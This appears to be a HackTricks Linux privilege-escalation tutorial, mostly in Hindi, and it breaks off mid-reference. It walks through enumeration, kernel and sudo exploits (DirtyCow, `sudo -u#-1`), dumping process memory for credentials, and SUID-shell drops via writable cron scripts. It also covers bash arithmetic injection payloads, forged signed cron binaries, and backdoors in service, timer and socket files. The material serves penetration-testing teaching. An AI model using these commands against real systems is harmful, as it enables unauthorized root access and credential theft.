# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## सिस्टम जानकारी

### OS जानकारी

आइए चल रहे OS के बारे में कुछ जानकारी प्राप्त करना शुरू करते हैं।
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

यदि आपके पास **`PATH` वेरिएबल के किसी भी फ़ोल्डर पर लिखने की अनुमति** है, तो आप कुछ libraries या binaries को hijack कर सकते हैं:
```bash
echo $PATH
```
### Env info

क्या environment variables में कोई रोचक जानकारी, passwords या API keys हैं?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Kernel version जाँचें और देखें कि कोई exploit है जो privileges escalate करने के लिए इस्तेमाल किया जा सकता है।
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
आप यहाँ एक अच्छा vulnerable kernel list और कुछ पहले से ही **compiled exploits** पा सकते हैं: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
अन्य साइटें जहाँ आप कुछ **compiled exploits** पा सकते हैं: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

उस वेब से सभी vulnerable kernel versions निकालने के लिए आप कर सकते हैं:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
kernel exploits खोजने में मदद करने वाले टूल्स:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (execute IN victim,only checks exploits for kernel 2.x)

हमेशा **Google में kernel version खोजें**, हो सकता है कि आपका kernel version किसी kernel exploit में लिखा हो और तब आप सुनिश्चित होंगे कि यह exploit वैध है।

अतिरिक्त kernel exploitation techniques:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo version

उन vulnerable sudo versions के आधार पर जो निम्न में दिखाई देते हैं:
```bash
searchsploit sudo
```
आप इस grep का उपयोग करके यह जाँच सकते हैं कि sudo का संस्करण vulnerable है या नहीं।
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo के 1.9.17p1 से पहले के संस्करण (**1.9.14 - 1.9.17 < 1.9.17p1**) unprivileged local users को sudo `--chroot` विकल्प के माध्यम से root तक privileges escalate करने की अनुमति देते हैं, जब `/etc/nsswitch.conf` फ़ाइल किसी user controlled डायरेक्टरी से उपयोग की जाती है।

Here is a [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Before running the exploit, make sure that your `sudo` version is vulnerable and that it supports the `chroot` feature.

For more information, refer to the original [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

#### sudo < v1.8.28

From @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg signature verification failed

जाँचें **smasher2 box of HTB** यह देखने के लिए कि इस vuln को कैसे exploited किया जा सकता है — एक **उदाहरण**
```bash
dmesg 2>/dev/null | grep "signature"
```
### और system enumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## संभावित सुरक्षा उपायों की सूची

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

यदि आप किसी docker container के अंदर हैं, तो आप इससे बाहर निकलने की कोशिश कर सकते हैं:


{{#ref}}
docker-security/
{{#endref}}

## ड्राइव्स

जाँचें **क्या mounted और unmounted है**, कहाँ और क्यों। यदि कुछ भी unmounted है तो आप उसे mount करके निजी जानकारी की जाँच कर सकते हैं।
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## उपयोगी सॉफ़्टवेयर

उपयोगी binaries की सूची बनाएं
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
साथ ही यह भी जांचें कि **कोई compiler इंस्टॉल है**। यह तब उपयोगी होता है जब आपको किसी kernel exploit का उपयोग करने की जरूरत हो, क्योंकि सलाह दी जाती है कि इसे उसी मशीन पर compile किया जाए जहाँ आप इसका उपयोग करने वाले हैं (या किसी समान मशीन पर)।
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### स्थापित कमजोर सॉफ़्टवेयर

स्थापित पैकेजों और सेवाओं के **संस्करण** की जाँच करें। शायद कोई पुराना Nagios संस्करण (उदाहरण के लिए) मौजूद हो जिसे exploit करके escalating privileges हासिल किया जा सके…\
अनुशंसा की जाती है कि अधिक संदिग्ध स्थापित सॉफ़्टवेयर के संस्करण को मैन्युअली जाँचा जाए।
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _ध्यान दें कि ये कमांड बहुत सारी जानकारी दिखाएंगे जो ज्यादातर बेकार होगी, इसलिए OpenVAS जैसे कुछ applications या समान टूल्स की सलाह दी जाती है जो यह जाँचें कि कोई भी इंस्टॉल किया गया सॉफ़्टवेयर संस्करण ज्ञात exploits के लिए vulnerable तो नहीं है_

## Processes

देखें कि किन प्रक्रियाओं को निष्पादित किया जा रहा है और जाँचें कि किसी भी प्रक्रिया के पास उसे होने चाहिए उससे अधिक अधिकार तो नहीं हैं (शायद कोई tomcat root द्वारा चल रहा हो?)
```bash
ps aux
ps -ef
top -n 1
```
Always check for possible [**electron/cef/chromium debuggers** running, you could abuse it to escalate privileges](electron-cef-chromium-debugger-abuse.md). **Linpeas** detect those by checking the `--inspect` parameter inside the command line of the process.\
Also **check your privileges over the processes binaries**, maybe you can overwrite someone.

### Process monitoring

You can use tools like [**pspy**](https://github.com/DominicBreuker/pspy) to monitor processes. This can be very useful to identify vulnerable processes being executed frequently or when a set of requirements are met.

### Process memory

Some services of a server save **credentials in clear text inside the memory**.\
Normally you will need **root privileges** to read the memory of processes that belong to other users, therefore this is usually more useful when you are already root and want to discover more credentials.\
However, remember that **as a regular user you can read the memory of the processes you own**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB स्क्रिप्ट
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

किसी दिए गए process ID के लिए, **maps यह दिखाते हैं कि उस प्रोसेस के वर्चुअल एड्रेस स्पेस में memory कैसे मैप की गई है**; यह प्रत्येक मैप्ड क्षेत्र के **permissions** भी दिखाता है। The **mem** pseudo file **खुद प्रोसेस की memory को उजागर करता है**। **maps** फाइल से हमें पता चलता है कि कौन से **memory regions पढ़ने योग्य हैं** और उनके offsets क्या हैं। हम इस जानकारी का उपयोग करके **mem file में seek करके सभी पढ़ने योग्य regions को एक फ़ाइल में dump करते हैं**।
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` सिस्टम की **भौतिक** मेमोरी तक पहुँच प्रदान करता है, न कि वर्चुअल मेमोरी। कर्नेल के वर्चुअल address space तक /dev/kmem का उपयोग करके पहुँच की जा सकती है.\
आमतौर पर, `/dev/mem` केवल **root** और **kmem** समूह द्वारा पढ़ने योग्य होता है।
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump for linux

ProcDump Windows के लिए Sysinternals suite के क्लासिक ProcDump tool का Linux के लिए पुनर्कल्पना है। इसे प्राप्त करें [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### उपकरण

Process memory को dump करने के लिए आप इनका उपयोग कर सकते हैं:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_आप मैन्युअली root आवश्यकताएँ हटाकर आपके स्वामित्व वाले process को dump कर सकते हैं
- Script A.5 from [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root आवश्यक है)

### Process Memory से Credentials

#### मैनुअल उदाहरण

यदि आप पाते हैं कि authenticator process चल रहा है:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
आप process को dump कर सकते हैं (पहले के सेक्शन देखें ताकि process की memory को dump करने के अलग‑अलग तरीके मिल सकें) और memory के अंदर credentials खोज सकते हैं:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

यह टूल [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) मेमोरी से **steal clear text credentials from memory** और कुछ **well known files** से इन्हें चुरा लेगा। यह सही तरीके से काम करने के लिए root privileges की आवश्यकता रखता है।

| फ़ीचर                                           | प्रोसेस नाम         |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Search Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## शेड्यूल्ड/Cron jobs

### Crontab UI (alseambusher) running as root – वेब-आधारित scheduler privesc

यदि वेब “Crontab UI” पैनल (alseambusher/crontab-ui) root के रूप में चलता है और केवल loopback पर बन्धा हुआ है, तो आप इसे SSH local port-forwarding के माध्यम से पहुँच सकते हैं और escalate करने के लिए एक privileged job बना सकते हैं।

Typical chain
- Discover loopback-only port (e.g., 127.0.0.1:8000) and Basic-Auth realm via `ss -ntlp` / `curl -v localhost:8000`
- Find credentials in operational artifacts:
- Backups/scripts with `zip -P <password>`
- systemd unit exposing `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tunnel and login:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- एक high-priv job बनाएँ और तुरंत चलाएँ (drops SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- इसे उपयोग करें:
```bash
/tmp/rootshell -p   # root shell
```
हार्डनिंग
- Crontab UI को root के रूप में न चलाएँ; इसे एक समर्पित user और न्यूनतम permissions के साथ सीमित करें
- localhost पर बाइंड करें और अतिरिक्त रूप से firewall/VPN के माध्यम से access सीमित करें; पासवर्ड पुन: उपयोग न करें
- unit files में secrets को embed करने से बचें; secret stores या root-only EnvironmentFile का उपयोग करें
- on-demand job executions के लिए audit/logging सक्षम करें

जाँचें कि कोई scheduled job vulnerable है या नहीं। शायद आप root द्वारा executed किसी script का फायदा उठा सकें (wildcard vuln? क्या root इस्तेमाल करने वाली फ़ाइलों को modify कर सकते हैं? symlinks का उपयोग करें? उस directory में specific files बनाएं जिन्हें root उपयोग करता है?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Cron पाथ

For example, inside _/etc/crontab_ you can find the PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_ध्यान दें कि user "user" के पास /home/user पर लिखने की अनुमति है_)

यदि इस crontab के अंदर root user किसी command या script को PATH सेट किए बिना execute करने की कोशिश करता है। उदाहरण के लिए: _\* \* \* \* root overwrite.sh_\
तब, आप निम्नलिखित का उपयोग करके root shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron एक wildcard वाले script का उपयोग (Wildcard Injection)

यदि कोई script root द्वारा execute किया जाता है और किसी command के अंदर “**\***” है, तो आप इसे exploit कर के अनपेक्षित चीज़ें (जैसे privesc) कर सकते हैं। उदाहरण:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**यदि wildcard किसी path से पहले होता है जैसे** _**/some/path/\***_ **, यह vulnerable नहीं है (यहाँ तक कि** _**./\***_ **भी नहीं).**

अधिक wildcard exploitation tricks के लिए निम्नलिखित पृष्ठ पढ़ें:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash ((...)), $((...)) और let में arithmetic evaluation से पहले parameter expansion और command substitution करता है। यदि कोई root cron/parser untrusted log fields पढ़कर उन्हें arithmetic context में देता है, तो attacker एक command substitution $(...) inject कर सकता है जो cron के चलने पर root के रूप में execute होता है।

- Why it works: Bash में expansions इस क्रम में होते हैं: parameter/variable expansion, command substitution, arithmetic expansion, फिर word splitting और pathname expansion. इसलिए `$(/bin/bash -c 'id > /tmp/pwn')0` जैसा मान पहले substitute होता है (कमांड चलता है), फिर शेष संख्या `0` arithmetic के लिए उपयोग होता है इसलिए स्क्रिप्ट बिना त्रुटि के जारी रहती है।

- Typical vulnerable pattern:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Attacker-controlled text को parsed log में लिखवाएं ताकि numeric-दिखने वाला field command substitution रखे और एक digit पर समाप्त हो। सुनिश्चित करें कि आपका command stdout पर कुछ print न करे (या उसे redirect करें) ताकि arithmetic वैध रहे।
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

यदि आप **cron script को modify कर सकते हैं** जो root द्वारा चलाया जाता है, तो आप बहुत आसानी से एक shell प्राप्त कर सकते हैं:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
यदि root द्वारा निष्पादित script किसी ऐसे **directory where you have full access** का उपयोग करता है, तो उस folder को delete कर के और उसकी जगह एक **create a symlink folder to another one** रख देना — जो आपके द्वारा नियंत्रित script को serve करे — उपयोगी हो सकता है।
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Custom-signed cron binaries with writable payloads
ब्लू टीमें कभी-कभी cron-प्रेरित बाइनरीज़ को "sign" करती हैं — एक custom ELF सेक्शन dump करके और vendor string के लिए grep करके — और उन्हें root के रूप में execute करने से पहले सत्यापित करती हैं। अगर वह बाइनरी group-writable है (उदा., `/opt/AV/periodic-checks/monitor` जिसका owner `root:devs 770` है) और आप signing material को leak कर सकते हैं, तो आप सेक्शन को forge करके cron task को hijack कर सकते हैं:

1. `pspy` का उपयोग करके verification flow को capture करें। उदाहरण के लिए Era में root ने `objcopy --dump-section .text_sig=text_sig_section.bin monitor` चलाया, उसके बाद `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` और फिर फ़ाइल को execute किया।
2. leaked key/config का उपयोग करके अपेक्षित certificate फिर से बनाएं (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. एक malicious replacement बनाएं (उदा., SUID bash drop करें, अपना SSH key जोड़ें) और certificate को `.text_sig` में embed करें ताकि grep पास हो जाए:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. execute बिट्स बनाए रखते हुए scheduled binary को overwrite करें:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. अगली cron run का इंतज़ार करें; एक बार जब naive signature check सफल हो जाएगी, आपका payload root के रूप में चलेगा।

### Frequent cron jobs

आप processes को monitor करके उन processes को खोज सकते हैं जो हर 1, 2 या 5 मिनट पर execute होते हैं। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **1 minute तक हर 0.1s पर monitor करने**, **कम-चलाए गए commands के अनुसार sort करने** और सबसे अधिक execute हुए commands को हटाने के लिए, आप कर सकते हैं:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**आप यह भी उपयोग कर सकते हैं** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (यह शुरू होने वाली हर process की निगरानी करेगा और सूची बनाएगा).

### अदृश्य cron jobs

यह संभव है कि आप एक cronjob बना सकें **putting a carriage return after a comment** (without newline character), और cron job काम करेगा। उदाहरण (carriage return char पर ध्यान दें):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल को लिख सकते हैं, अगर हाँ, तो आप इसे **संशोधित कर सकते हैं** ताकि यह आपकी **backdoor को निष्पादित करे जब** service **शुरू**, **पुनः आरंभ** या **रोक दिया गया** हो (शायद आपको मशीन के reboot होने तक इंतज़ार करना पड़े).\
उदाहरण के लिए अपनी backdoor को .service फ़ाइल के अंदर बनाएं जैसे **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service बाइनरीज़

ध्यान रखें कि यदि आपके पास उन बाइनरीज़ पर **लिखने की अनुमति** है जिन्हें सेवाएँ निष्पादित करती हैं, तो आप उन्हें backdoors के लिए बदल सकते हैं ताकि जब सेवाएँ पुनः निष्पादित हों तो backdoors निष्पादित हो जाएँ।

### systemd PATH - सापेक्ष पथ

आप **systemd** द्वारा उपयोग किए जाने वाले PATH को निम्नलिखित तरीके से देख सकते हैं:
```bash
systemctl show-environment
```
यदि आप पथ के किसी भी फ़ोल्डर में **write** कर पा रहे हैं तो आप संभवतः **escalate privileges** कर सकते हैं। आपको ऐसे फ़ाइलों में **relative paths being used on service configurations** की तलाश करनी चाहिए, जैसे:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
फिर, systemd PATH फ़ोल्डर जिसमें आप लिख सकते हैं, के भीतर relative path binary के उसी नाम का एक **executable** बनाएं, और जब सर्विस से vulnerable action (**Start**, **Stop**, **Reload**) को execute करने के लिए कहा जाएगा, तो आपका **backdoor** चलाया जाएगा (unprivileged users सामान्यतः सेवाएँ start/stop नहीं कर पाते — पर जाँचें कि क्या आप `sudo -l` इस्तेमाल कर सकते हैं)।

**`man systemd.service` से services के बारे में और जानें।**

## **Timers**

**Timers** वे systemd unit फाइलें हैं जिनके नाम का अंत `**.timer**` से होता है और जो `**.service**` फाइलों या इवेंट्स को नियंत्रित करती हैं। **Timers** को cron के विकल्प के रूप में इस्तेमाल किया जा सकता है क्योंकि इनमें calendar time events और monotonic time events के लिए built-in सपोर्ट होता है और इन्हें asynchronously चलाया जा सकता है।

आप सभी Timers को enumerate कर सकते हैं:
```bash
systemctl list-timers --all
```
### लिखने योग्य टाइमर

यदि आप किसी टाइमर को संशोधित कर सकते हैं तो आप इसे systemd.unit की कुछ मौजूदा इकाइयों (जैसे `.service` या `.target`) को चलाने के लिए बना सकते हैं।
```bash
Unit=backdoor.service
```
In the documentation you can read what the Unit is:

> यह वह unit है जिसे इस timer के समाप्त होने पर सक्रिय किया जाएगा। तर्क एक unit नाम है, जिसका suffix ".timer" नहीं है। यदि निर्दिष्ट नहीं किया गया है, तो यह मान उस service पर डिफ़ॉल्ट हो जाएगा जिसका नाम timer unit के समान है, केवल suffix अलग होगा। (ऊपर देखें।) यह अनुशंसित है कि सक्रिय की जाने वाली unit का नाम और timer unit का नाम suffix को छोड़कर समान हों।

Therefore, to abuse this permission you would need to:

- किसी systemd unit (जैसे `.service`) को खोजें जो **executing a writable binary** चला रहा हो
- ऐसा कोई systemd unit खोजें जो **executing a relative path** कर रहा हो और आपके पास उस **systemd PATH** पर **writable privileges** हों (ताकि आप उस executable की नक़ल कर सकें)

**timers के बारे में और जानने के लिए `man systemd.timer` देखें।**

### **Timer सक्षम करना**

Timer को सक्षम करने के लिए आपको root privileges चाहिए और निम्नलिखित execute करना होगा:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
ध्यान दें कि **timer** को `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर उसके लिए एक symlink बनाकर **सक्रिय** किया जाता है

## Sockets

Unix Domain Sockets (UDS) client-server मॉडल्स के भीतर एक ही या अलग मशीनों पर **process communication** सक्षम करते हैं। वे कंप्यूटर-के-अंतर संचार के लिए मानक Unix descriptor फाइलों का उपयोग करते हैं और `.socket` फ़ाइलों के माध्यम से सेट अप किए जाते हैं।

Sockets को `.socket` फाइलों का उपयोग करके कॉन्फ़िगर किया जा सकता है।

**`man systemd.socket` के साथ sockets के बारे में अधिक जानें।** इस फ़ाइल के अंदर, कई दिलचस्प पैरामीटर कॉन्फ़िगर किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये विकल्प अलग-अलग हैं, लेकिन सारांश में यह दर्शाने के लिए उपयोग किया जाता है कि यह socket कहाँ सुनने वाला है (AF_UNIX socket फ़ाइल का path, IPv4/6 और/या सुनने के लिए port number, आदि)।
- `Accept`: boolean argument लेता है। यदि **true**, तो हर इनकमिंग कनेक्शन के लिए एक **service instance spawned** होता है और केवल connection socket ही उसे पास किया जाता है। यदि **false**, तो सभी listening sockets खुद **started service unit को पास** किए जाते हैं, और सभी कनेक्शनों के लिए केवल एक service unit spawn होता है। यह मान datagram sockets और FIFOs के लिए अनदेखा किया जाता है जहाँ एक ही service unit बिना शर्त सभी इनकमिंग ट्रैफिक को संभालता है। **Defaults to false**. प्रदर्शन कारणों से, नए daemons केवल इस तरह लिखने की सलाह दी जाती है कि वे `Accept=no` के अनुकूल हों।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेता है, जिन्हें क्रमशः listening **sockets**/FIFOs के बने और bind किए जाने से पहले या बाद में **execute** किया जाता है। कमांड लाइन का पहला token एक absolute filename होना चाहिए, उसके बाद process के लिए arguments आते हैं।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands** जिन्हें क्रमशः listening **sockets**/FIFOs के बंद और हटाए जाने से पहले या बाद में **execute** किया जाता है।
- `Service`: इनकमिंग ट्रैफिक पर एक्टिवेट करने के लिए **service** unit का नाम निर्दिष्ट करता है। यह सेटिंग केवल Accept=no वाले sockets के लिए अनुमति है। यह डिफ़ॉल्ट रूप से उस service को चुनता है जिसका नाम socket के समान होता है (suffix बदलकर)। अधिकांश मामलों में, इस विकल्प का उपयोग आवश्यक नहीं होना चाहिए।

### Writable .socket files

यदि आप एक **writable** `.socket` फ़ाइल पाते हैं तो आप `[Socket]` सेक्शन की शुरुआत में कुछ इस तरह जोड़ सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और backdoor socket बनाये जाने से पहले execute होगा। इसलिए, आपको **शायद मशीन के reboot होने तक प्रतीक्षा करनी होगी।**\
_ध्यान दें कि सिस्टम को उस socket file configuration का उपयोग कर रहा होना चाहिए वरना backdoor execute नहीं होगा_

### Writable sockets

यदि आप कोई **writable socket** पहचानते हैं (_अब हम config `.socket` फ़ाइलों के बारे में नहीं, बल्कि Unix Sockets के बारे में बात कर रहे हैं_), तो आप उस socket के साथ **communicate** कर सकते हैं और शायद किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets को सूचीबद्ध करना
```bash
netstat -a -p --unix
```
### कच्चा कनेक्शन
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Exploitation example:**


{{#ref}}
